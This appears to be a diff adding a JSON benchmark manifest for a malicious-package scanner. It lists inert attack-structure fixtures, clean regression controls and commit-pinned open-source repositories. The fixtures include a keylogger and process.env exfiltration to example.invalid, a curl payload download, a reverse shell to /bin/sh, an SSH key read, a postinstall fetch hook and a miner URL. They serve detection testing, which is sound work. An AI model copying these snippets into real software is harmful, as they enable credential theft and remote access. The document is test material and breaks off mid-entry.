@@ -1,0 +1,1534 @@
+{
+  "benchmarkVersion": "0.1.0",
+  "sources": [
+    {
+      "name": "OpenSSF Malicious Packages",
+      "url": "https://github.com/ossf/malicious-packages",
+      "usage": "Independent labels and package/version metadata; withdrawn reports must be excluded."
+    },
+    {
+      "name": "Datadog malicious software packages dataset",
+      "url": "https://github.com/DataDog/malicious-software-packages-dataset",
+      "usage": "Human-triaged private static-sample evaluation only; archives must never be executed."
+    },
+    {
+      "name": "GitHub Amalfi artifact",
+      "url": "https://github.com/githubnext/amalfi-artifact",
+      "usage": "Methodology comparison and externally labeled experiment data."
+    }
+  ],
+  "samples": [
+    {
+      "sampleId": "critical-keylogger-exfil-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed behavior: keyboard capture plus network sink",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "EXFIL_KEYLOGGER"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture() { document.addEventListener('keydown', event => { fetch('https://example.invalid/collect', { method: 'POST', body: event.key }) }) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-beavertail-loader-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed Lazarus BeaverTail loader structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "BEAVERTAIL_LOADER_V1"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture() { require('child_process').exec('curl https://example.invalid/payload') }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-env-exfil-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed environment-variable exfiltration structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "BEAVERTAIL_EXFIL"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture() { const body = JSON.stringify(process.env); fetch('https://example.invalid/collect', { method: 'POST', body }) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-reverse-shell-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed reverse-shell socket structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "REVERSE_SHELL"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(net) { const socket = net.Socket(); const shell = require('child_process').spawn('/bin/sh'); socket.pipe(shell.stdin); shell.stdout.pipe(socket); return socket }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-crypto-miner-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed cryptocurrency-miner endpoint structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "CRYPTO_MINER"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export const inertPoolReference = 'stratum+tcp://example.invalid:3333'\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-obfuscated-eval-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed Base64-decoded dynamic execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "OBFUSCATED_EVAL"
+      ],
+      "minimumExpectedVerdict": "medium",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(encoded) { if (false) eval(atob(encoded)) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-rce-endpoint-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed request-driven remote-code-execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "BACKDOOR_RCE_ENDPOINT"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(req) { if (false) eval(req.body.command) }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-credential-file-read-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed credential-file access structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "FILE_ACCESS_CREDENTIALS"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export function inertFixture(fs) { if (false) fs.readFileSync('/home/example/.ssh/id_rsa') }\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-aws-key-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed AWS access-key pattern using a reserved dummy value",
+      "sourceUrl": "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_identifiers.html",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "HARDCODED_AWS_KEY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/fixture.js": "export const inertDummyAwsKey = 'AKIA1234567890ABCDEF'\n"
+        }
+      }
+    },
+    {
+      "sampleId": "critical-install-script-v1",
+      "corpus": "critical-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Flagrix claimed install-time download and dynamic execution structure",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "POSTINSTALL_SCRIPT"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"inert-install-fixture\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"curl https://example.invalid/payload && node -e \\\"eval('')\\\"\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-keyboard-shortcut-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for ordinary keyboard UI handling",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/ui.js": "document.addEventListener('keydown', event => { if (event.key === 'Escape') closeModal() })\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-placeholder-secret-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for documented placeholder configuration",
+      "sourceUrl": "https://github.com/9valleb9/SPY-Options-Dashboard",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "app.py": "app.secret_key = 'your-secret-key-change-in-production'\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-flask-debug-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control: deployment warning must not be labeled a backdoor",
+      "sourceUrl": "https://github.com/9valleb9/SPY-Options-Dashboard",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "app.py": "app.run(debug=True, host='0.0.0.0', port=5000)\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-detector-regex-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Regression control for security tools containing inert detector regexes",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-scanner-core",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/rules.js": "export const keyloggerPattern = /addEventListener\\(['\\\"']keydown/gi\nexport const minerPattern = /stratum\\+tcp:\\/\\//gi\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-event-stream-safe-version-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Version-bound negative control for the compromised event-stream 3.3.6 incident",
+      "sourceUrl": "https://github.com/dominictarr/event-stream",
+      "immutableRef": "package:event-stream@4.0.1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"reference-consumer\",\"version\":\"1.0.0\",\"dependencies\":{\"event-stream\":\"4.0.1\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-express",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/expressjs/express",
+      "immutableRef": "ae6dd37680e3a00618d6c8a3e522f0ee4eeba1a4",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "expressjs/express",
+        "ref": "ae6dd37680e3a00618d6c8a3e522f0ee4eeba1a4"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "reference-fastify",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/fastify/fastify",
+      "immutableRef": "de3752df84bb8dd35a8226bb467f05862f4da57c",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "fastify/fastify",
+        "ref": "de3752df84bb8dd35a8226bb467f05862f4da57c"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-koa",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/koajs/koa",
+      "immutableRef": "52d5e8ff5ac79f2479463b53df2999900ae95115",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "koajs/koa",
+        "ref": "52d5e8ff5ac79f2479463b53df2999900ae95115"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "reference-axios",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/axios/axios",
+      "immutableRef": "3ebc76240c835a07fc6af23cb10d41579371a08f",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "axios/axios",
+        "ref": "3ebc76240c835a07fc6af23cb10d41579371a08f"
+      },
+      "defaultBranchAtPin": "v1.x"
+    },
+    {
+      "sampleId": "reference-lodash",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/lodash/lodash",
+      "immutableRef": "a666ba591064c8011988275790ad7d625279f09c",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "lodash/lodash",
+        "ref": "a666ba591064c8011988275790ad7d625279f09c"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-chalk",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/chalk/chalk",
+      "immutableRef": "aa06bb5ac3f14df9fda8cfb54274dfc165ddfdef",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "chalk/chalk",
+        "ref": "aa06bb5ac3f14df9fda8cfb54274dfc165ddfdef"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-uuid",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/uuidjs/uuid",
+      "immutableRef": "ea83515d6a4de13a8f9d253fe772752c9dd7bbbe",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "uuidjs/uuid",
+        "ref": "ea83515d6a4de13a8f9d253fe772752c9dd7bbbe"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-node-fetch",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/node-fetch/node-fetch",
+      "immutableRef": "8b3320d2a7c07bce4afc6b2bf6c3bbddda85b01f",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "node-fetch/node-fetch",
+        "ref": "8b3320d2a7c07bce4afc6b2bf6c3bbddda85b01f"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-react",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/facebook/react",
+      "immutableRef": "c0c39a6b3907eaab35f43074949e2957a2a734c1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "facebook/react",
+        "ref": "c0c39a6b3907eaab35f43074949e2957a2a734c1"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-vue",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vuejs/core",
+      "immutableRef": "9e03beb6b4c85a9d5b49b731c08263aa648e2a2a",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "vuejs/core",
+        "ref": "9e03beb6b4c85a9d5b49b731c08263aa648e2a2a"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-svelte",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/sveltejs/svelte",
+      "immutableRef": "b4d1583ae20f3869a88a731d9a265c546c099f66",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "sveltejs/svelte",
+        "ref": "b4d1583ae20f3869a88a731d9a265c546c099f66"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-vite",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vitejs/vite",
+      "immutableRef": "fef682d3f067d534a559faf6fd9baedda2e9f8f1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "vitejs/vite",
+        "ref": "fef682d3f067d534a559faf6fd9baedda2e9f8f1"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-next",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/vercel/next.js",
+      "immutableRef": "93249ee06d6e0c105b1278412768c8e0816d9936",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "vercel/next.js",
+        "ref": "93249ee06d6e0c105b1278412768c8e0816d9936"
+      },
+      "defaultBranchAtPin": "canary"
+    },
+    {
+      "sampleId": "reference-nest",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "User-provided normal-project starter set",
+      "sourceUrl": "https://github.com/nestjs/nest",
+      "immutableRef": "f2938487c45db149964a8b0efc58a073610dcdf1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "nestjs/nest",
+        "ref": "f2938487c45db149964a8b0efc58a073610dcdf1"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "noisy-vscode",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/microsoft/vscode",
+      "immutableRef": "af2c64423e7ee5d1030a000c82a0bb774d043351",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "microsoft/vscode",
+        "ref": "af2c64423e7ee5d1030a000c82a0bb774d043351"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-playwright",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/microsoft/playwright",
+      "immutableRef": "2670e5cae0239502d053e530da2c675e5aa536aa",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "microsoft/playwright",
+        "ref": "2670e5cae0239502d053e530da2c675e5aa536aa"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-cypress",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/cypress-io/cypress",
+      "immutableRef": "cd8bb88f1080d0ee354e605fadba986b03320828",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "cypress-io/cypress",
+        "ref": "cd8bb88f1080d0ee354e605fadba986b03320828"
+      },
+      "defaultBranchAtPin": "develop"
+    },
+    {
+      "sampleId": "noisy-electron",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/electron/electron",
+      "immutableRef": "8215b5aa536ec6ae121003bc618bdd825bdbbb0f",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "electron/electron",
+        "ref": "8215b5aa536ec6ae121003bc618bdd825bdbbb0f"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-esbuild",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/evanw/esbuild",
+      "immutableRef": "6ff1d8b0d8c134e867a397eef39702a223ebef9e",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "evanw/esbuild",
+        "ref": "6ff1d8b0d8c134e867a397eef39702a223ebef9e"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-node",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "User-provided scanner-hostile starter set",
+      "sourceUrl": "https://github.com/nodejs/node",
+      "immutableRef": "1314579f8c82ed70b8cbe736fdea1df48624c285",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "nodejs/node",
+        "ref": "1314579f8c82ed70b8cbe736fdea1df48624c285"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-hapijs-hapi",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/hapijs/hapi",
+      "immutableRef": "d4f93d80e6acadb0000f1cf67f9b1b5992e8a8cc",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "hapijs/hapi",
+        "ref": "d4f93d80e6acadb0000f1cf67f9b1b5992e8a8cc"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "reference-reduxjs-redux",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/reduxjs/redux",
+      "immutableRef": "5d65348e26635b6ec627b1030732ed38797e88e9",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "reduxjs/redux",
+        "ref": "5d65348e26635b6ec627b1030732ed38797e88e9"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "reference-reduxjs-redux-toolkit",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/reduxjs/redux-toolkit",
+      "immutableRef": "7b269256424e1d44baf83d7de634d9f53931dda7",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "reduxjs/redux-toolkit",
+        "ref": "7b269256424e1d44baf83d7de634d9f53931dda7"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "reference-immerjs-immer",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/immerjs/immer",
+      "immutableRef": "60ca295e1185db80322ef55ec3fb8475cbc960c7",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "immerjs/immer",
+        "ref": "60ca295e1185db80322ef55ec3fb8475cbc960c7"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-date-fns-date-fns",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/date-fns/date-fns",
+      "immutableRef": "4098115cf705e3af7f663d8e5b0686e39a9f478a",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "date-fns/date-fns",
+        "ref": "4098115cf705e3af7f663d8e5b0686e39a9f478a"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-ramda-ramda",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/ramda/ramda",
+      "immutableRef": "bcb320e60b5d91c958a6b02feb0bd8658d744298",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "ramda/ramda",
+        "ref": "bcb320e60b5d91c958a6b02feb0bd8658d744298"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "reference-sindresorhus-got",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/sindresorhus/got",
+      "immutableRef": "e3924aa1e53a6ca3eb93a43618ce532442a89b40",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "sindresorhus/got",
+        "ref": "e3924aa1e53a6ca3eb93a43618ce532442a89b40"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-socketio-socket-io",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/socketio/socket.io",
+      "immutableRef": "d2d753fed4435015c2d83fe62e676b44e07fa3f7",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "socketio/socket.io",
+        "ref": "d2d753fed4435015c2d83fe62e676b44e07fa3f7"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-apollographql-apollo-client",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/apollographql/apollo-client",
+      "immutableRef": "c843c98a803d7d7f48f4da72080a61d9086dc8ad",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "apollographql/apollo-client",
+        "ref": "c843c98a803d7d7f48f4da72080a61d9086dc8ad"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-tanstack-query",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/TanStack/query",
+      "immutableRef": "79d2384db5c8776680d5bfbe9b595618c066248b",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "TanStack/query",
+        "ref": "79d2384db5c8776680d5bfbe9b595618c066248b"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-testing-library-react-testing-library",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/testing-library/react-testing-library",
+      "immutableRef": "be9d81d91314c9f0bafaa363f70b409b4b31989c",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "testing-library/react-testing-library",
+        "ref": "be9d81d91314c9f0bafaa363f70b409b4b31989c"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-prisma-prisma",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/prisma/prisma",
+      "immutableRef": "cda80a4488b7b551c36bf09ca2e8303ef9509da4",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "prisma/prisma",
+        "ref": "cda80a4488b7b551c36bf09ca2e8303ef9509da4"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-tailwindlabs-tailwindcss",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/tailwindlabs/tailwindcss",
+      "immutableRef": "35a3e9c5159bea77af0d48f0c8849279211cc7e9",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "tailwindlabs/tailwindcss",
+        "ref": "35a3e9c5159bea77af0d48f0c8849279211cc7e9"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-prettier-prettier",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/prettier/prettier",
+      "immutableRef": "41a8b99bb8d7d68c00d90d5b8fbaed20511d4cfd",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "prettier/prettier",
+        "ref": "41a8b99bb8d7d68c00d90d5b8fbaed20511d4cfd"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-eslint-eslint",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/eslint/eslint",
+      "immutableRef": "c5963f74bfa82a5b7ccc0607dcdcc695b8c97a31",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "eslint/eslint",
+        "ref": "c5963f74bfa82a5b7ccc0607dcdcc695b8c97a31"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "reference-pnpm-pnpm",
+      "corpus": "reference-clean",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/pnpm/pnpm",
+      "immutableRef": "0dd21df7457d2026f411f2c1a09104280b9b16e5",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "pnpm/pnpm",
+        "ref": "0dd21df7457d2026f411f2c1a09104280b9b16e5"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-denoland-deno",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/denoland/deno",
+      "immutableRef": "e5aed78415ded1213794bbf1ebbde1bf5cfa08b4",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "denoland/deno",
+        "ref": "e5aed78415ded1213794bbf1ebbde1bf5cfa08b4"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-oven-sh-bun",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/oven-sh/bun",
+      "immutableRef": "8f1a9540fdff25410506de76e0da2506d260c08f",
